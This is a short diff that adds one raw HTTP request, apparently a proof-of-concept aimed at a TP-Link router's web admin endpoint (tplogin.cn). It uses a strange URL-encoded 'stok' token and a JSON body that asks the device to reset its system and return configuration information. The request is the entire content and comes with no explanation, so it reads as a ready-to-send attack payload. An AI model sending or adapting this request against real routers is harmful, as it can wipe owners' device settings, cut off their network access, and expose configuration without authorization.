@@ -1,0 +1,6 @@
+POST /stok=az81d%7B%2CXo62~kjE%2CsylR%5D8%3Ev633(%2Bvd%3C/ds HTTP/1.1
+Host: tplogin.cn
+Content-Type: application/json
+Content-Length: 75
+
+{"system":{"reset":null},"method":"do", "cfgsync":{"get_config_info":null}}
